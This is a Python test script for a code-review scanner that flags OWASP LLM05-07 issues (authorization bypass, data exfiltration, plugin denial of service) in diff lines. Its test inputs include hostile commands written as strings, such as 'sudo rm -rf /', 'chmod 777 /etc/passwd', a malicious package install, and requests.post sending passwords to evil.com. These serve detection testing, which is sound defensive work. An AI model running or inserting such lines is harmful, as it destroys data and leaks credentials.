#!/usr/bin/env python3
"""
Test script for LLM05-07 security rules
Run: python test_llm05_07.py
"""

from security_checks import run_llm_security_rules

def test_llm05_authz_bypass():
    """Test LLM05: Authorization Bypass Detection"""
    print("🔍 Testing LLM05: Authorization Bypass")
    
    test_cases = [
        # Should trigger LLM05 alerts
        '+ role = "admin"',
        '+ is_admin = True',
        '+ bypass_auth = True',
        '+ from suspicious_package import *',
        '+ __import__(user_input)',
        '+ subprocess.run("pip install --trusted-host pypi.org malicious_package")',
        '+ chmod 777 /etc/passwd',
        '+ sudo rm -rf /',
        
        # Should NOT trigger (legitimate usage)
        '+ role = "user"',
        '+ import os',
        '+ from mypackage import specific_function',
    ]
    
    total_issues = 0
    for test_case in test_cases:
        issues = run_llm_security_rules(test_case)
        llm05_issues = [i for i in issues if "LLM05" in i['comment']]
        
        if llm05_issues:
            print(f"   ✅ DETECTED: {test_case.strip()}")
            for issue in llm05_issues:
                print(f"      └─ {issue['comment']}")
            total_issues += len(llm05_issues)
        else:
            print(f"   ⚪ CLEAN: {test_case.strip()}")
    
    print(f"   📊 LLM05 Total Issues Found: {total_issues}\n")
    return total_issues

def test_llm06_data_exfil():
    """Test LLM06: Data Exfiltration Detection"""
    print("🔍 Testing LLM06: Data Exfiltration")
    
    test_cases = [
        # Should trigger LLM06 alerts
        '+ requests.post("http://evil.com", data=sensitive_data)',
        '+ print(f"Password: {password}")',
        '+ log.info(f"API key: {api_key}")',
        '+ SELECT * FROM users',
        '+ open("/etc/passwd")',
        '+ email = "user@example.com"',
        '+ credit_card = "4532-1234-5678-9012"',
        '+ os.listdir("/")',
        
        # Should NOT trigger (safe usage)
        '+ requests.get("https://api.example.com")',
        '+ print("Processing complete")',
        '+ SELECT id FROM users WHERE active=1',
        '+ open("config.txt")',
    ]
    
    total_issues = 0
    for test_case in test_cases:
        issues = run_llm_security_rules(test_case)
        llm06_issues = [i for i in issues if "LLM06" in i['comment']]
        
        if llm06_issues:
            print(f"   ✅ DETECTED: {test_case.strip()}")
            for issue in llm06_issues:
                print(f"      └─ {issue['comment']}")
            total_issues += len(llm06_issues)
        else:
            print(f"   ⚪ CLEAN: {test_case.strip()}")
    
    print(f"   📊 LLM06 Total Issues Found: {total_issues}\n")
    return total_issues

def test_llm07_plugin_dos():
    """Test LLM07: Plugin DoS Detection"""
    print("🔍 Testing LLM07: Plugin DoS")
    
    test_cases = [
        # Should trigger LLM07 alerts
        '+ while True:',
        '+ for i in range(10000000):',
        '+ time.sleep(10000)',
        '+ data = [0] * 1000000',
        '+ importlib.import_module(user_plugin)',
        '+ exec(plugin_code)',
        '+ requests.get(url, timeout=999)',
        '+ sys.setrecursionlimit(100000)',
        '+ for i in range(1000): requests.get("http://target.com")',
        
        # Should NOT trigger (safe usage)
        '+ for i in range(100):',
        '+ time.sleep(1)',
        '+ data = [0] * 100',
        '+ import json',
        '+ requests.get(url, timeout=30)',
    ]
    
    total_issues = 0
    for test_case in test_cases:
        issues = run_llm_security_rules(test_case)
        llm07_issues = [i for i in issues if "LLM07" in i['comment']]
        
        if llm07_issues:
            print(f"   ✅ DETECTED: {test_case.strip()}")
            for issue in llm07_issues:
                print(f"      └─ {issue['comment']}")
            total_issues += len(llm07_issues)
        else:
            print(f"   ⚪ CLEAN: {test_case.strip()}")
    
    print(f"   📊 LLM07 Total Issues Found: {total_issues}\n")
    return total_issues

def test_combined_scenario():
    """Test a realistic code diff with LLM05-07 issues"""
    print("🔍 Testing Combined LLM05-07 Scenario")
    
    realistic_diff = """
+ import requests
+ from unknown_package import *
+ 
+ def admin_bypass():
+     # LLM05: Authorization bypass
+     role = "admin"
+     is_admin = True
+     
+     # LLM06: Data exfiltration
+     password = "secret123"
+     print(f"User password: {password}")
+     requests.post("http://evil.com", data={"pass": password})
+     
+     # LLM07: DoS vulnerabilities  
+     while True:
+         time.sleep(5000)
+         data = [0] * 10000000
+     
+     # LLM05: Supply chain
+     __import__(user_input)
+     
+     return "compromised"
"""
    
    issues = run_llm_security_rules(realistic_diff)
    
    # Categorize issues by LLM type
    categories = {}
    for issue in issues:
        if "LLM05" in issue['comment']:
            categories.setdefault("LLM05", []).append(issue)
        elif "LLM06" in issue['comment']:
            categories.setdefault("LLM06", []).append(issue)
        elif "LLM07" in issue['comment']:
            categories.setdefault("LLM07", []).append(issue)
        else:
            categories.setdefault("Other", []).append(issue)
    
    print(f"   📊 Combined Scenario Results:")
    for category, issues_list in categories.items():
        print(f"      {category}: {len(issues_list)} issues")
        for issue in issues_list[:2]:  # Show first 2 issues per category
            print(f"         └─ Line {issue['line']}: {issue['comment'][:60]}...")
    
    print(f"   📊 Total Issues: {len(issues)}\n")
    return len(issues)

def main():
    """Run all LLM05-07 tests"""
    print("🧪 Testing OWASP LLM Security Rules - LLM05, LLM06, LLM07")
    print("=" * 70)
    
    # Run tests
    llm05_count = test_llm05_authz_bypass()
    llm06_count = test_llm06_data_exfil()
    llm07_count = test_llm07_plugin_dos()
    combined_count = test_combined_scenario()
    
    # Summary
    print("📋 TEST SUMMARY")
    print("=" * 70)
    print(f"✅ LLM05 (AuthZ Bypass): {llm05_count} issues detected")
    print(f"✅ LLM06 (Data Exfil): {llm06_count} issues detected")
    print(f"✅ LLM07 (Plugin DoS): {llm07_count} issues detected") 
    print(f"✅ Combined Scenario: {combined_count} total issues detected")
    
    if llm05_count > 0 and llm06_count > 0 and llm07_count > 0:
        print("\n🎯 SUCCESS: All LLM05-07 rules are working!")
        print("📊 OWASP LLM Coverage: 4/10 → 7/10 (70%)")
        print("💡 Next step: Update your security_checks.py with the new functions")
        return True
    else:
        print("\n❌ ISSUE: Some rules are not detecting properly")
        print("💡 Check the pattern matching logic in the rule functions")
        return False

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)